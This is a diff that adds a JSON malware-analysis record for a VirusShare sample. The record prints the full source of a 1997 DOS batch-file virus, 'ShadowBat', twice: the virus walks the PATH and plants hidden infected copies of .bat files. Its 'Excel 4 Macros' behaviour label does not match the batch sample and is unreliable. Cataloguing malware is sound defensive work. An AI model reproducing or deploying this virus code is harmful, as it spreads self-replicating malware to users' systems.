@@ -1,0 +1,80 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off\nif %1#==## goto %2\ncd>c:\\cdsave$\necho.>>c:\\cdsave$\necho.>c:\\return$.bat\n%comspec% /f/e:5000 /c%0 # S\nc:\ncd\\\necho %%4\\>enter.bat\necho cd %%4>>enter.bat\ntype c:\\cdsave$|date|find \"Enter \">set$.bat \ncall set$.bat\ndel c:\\cdsave$\ndel c:\\enter.bat\ndel c:\\set$.bat\ndel c:\\return$.bat\ngoto R\n:S\nset vself=%0\n%0 # A %path%\n:A\nshift\nif %2#==# exit\nif exist %2\\%vself%.bat set vself=%2\\%vself%.bat\nif exist %2%vself%.bat set vself=%2%vself%.bat\nif exist %2\\%vself% set vself=%2\\%vself%\nif exist %2%vself% set vself=%2%vself%\nif not exist %vself% goto A\n%vself% # B %path%\n:B\nshift\nif %3#==# exit\nif not exist %3\\nul if not exist %3nul goto B\nif not exist %2\\nul if not exist %2nul goto B\n%3\\\ncd %3\nif exist *.bat %comspec% /f/e:5000 /c%vself% # E %2 %3\ngoto B\n:E\nfor %%i in (*.bat) do call %vself% # I %%i %3 %4\nexit\n:I\nset new=%4\\%3\nif exist %4nul set new=%4%3\nif exist %new% goto J\nset host=%5\\%3\nif exist %5%3 set host=%5%3\ntype %vself%|find /v \"DoNt% %CoPy\">%new%\necho>>%new% %host% %%1 %%2 %%3 %%4 %%5 %%6 %%7 %%8 %%9 %%DoNt% %CoPy%%\nattrib %new% +h\nexit\n:J\nset count$=%count$%*\nif not %count$%==*********************************** c:\\return$\necho ShadowBat 1997\nexit\n:R"
+    },
+    "filename": "VirusShare_3c4b983b0c352e1a0ffcfc0656980096",
+    "filesize": 1232,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3c4b983b0c352e1a0ffcfc0656980096",
+        "sha1": "cf00803057600897dbeef30d706e60c065e4dfc4",
+        "sha256": "848eb617ad5abc7a63f997505695bad14dba857a30333cc50393f089685c2aef"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "if %1#==## goto %2",
+            "cd>c:\\cdsave$",
+            "echo.>>c:\\cdsave$",
+            "echo.>c:\\return$.bat",
+            "%comspec% /f/e:5000 /c%0 # S",
+            "echo %%4\\>enter.bat",
+            "echo cd %%4>>enter.bat",
+            "type c:\\cdsave$|date|find \"Enter \">set$.bat ",
+            "call set$.bat",
+            "del c:\\cdsave$",
+            "del c:\\enter.bat",
+            "del c:\\set$.bat",
+            "del c:\\return$.bat",
+            "goto R",
+            "set vself=%0",
+            "%0 # A %path%",
+            "shift",
+            "if %2#==# exit",
+            "if exist %2\\%vself%.bat set vself=%2\\%vself%.bat",
+            "if exist %2%vself%.bat set vself=%2%vself%.bat",
+            "if exist %2\\%vself% set vself=%2\\%vself%",
+            "if exist %2%vself% set vself=%2%vself%",
+            "if not exist %vself% goto A",
+            "%vself% # B %path%",
+            "shift",
+            "if %3#==# exit",
+            "if not exist %3\\nul if not exist %3nul goto B",
+            "if not exist %2\\nul if not exist %2nul goto B",
+            "cd %3",
+            "if exist *.bat %comspec% /f/e:5000 /c%vself% # E %2 %3",
+            "goto B",
+            "for %%i in (*.bat) do call %vself% # I %%i %3 %4",
+            "exit",
+            "set new=%4\\%3",
+            "if exist %4nul set new=%4%3",
+            "if exist %new% goto J",
+            "set host=%5\\%3",
+            "if exist %5%3 set host=%5%3",
+            "type %vself%|find /v \"DoNt% %CoPy\">%new%",
+            "echo>>%new% %host% %%1 %%2 %%3 %%4 %%5 %%6 %%7 %%8 %%9 %%DoNt% %CoPy%%",
+            "attrib %new% +h",
+            "exit",
+            "set count$=%count$%*",
+            "if not %count$%==*********************************** c:\\return$",
+            "echo ShadowBat 1997",
+            "exit"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.262366",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
